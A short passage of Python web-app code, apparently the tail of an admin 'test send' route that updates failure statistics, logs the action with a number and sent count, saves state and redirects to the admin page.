    d["stats"]["total_failed"] = d["stats"].get("total_failed", 0) + failed
    log_act(d, "admin_test_send", f"{number} sent={sent}")
    save(d)
    return RedirectResponse(f"/admin?sent={sent}&fail={failed}", status_code=303)
